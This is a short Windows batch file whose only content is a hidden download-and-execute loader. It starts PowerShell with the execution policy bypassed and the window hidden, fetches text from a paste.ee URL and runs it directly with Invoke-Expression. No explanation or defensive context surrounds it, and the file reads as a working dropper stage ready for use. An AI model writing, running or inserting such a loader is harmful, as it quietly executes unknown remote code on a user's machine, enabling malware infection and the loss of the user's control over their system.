@echo off

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^

"Invoke-Expression (Invoke-WebRequest -Uri 'https://paste.ee/d/i2aOdBuB/0').Content"
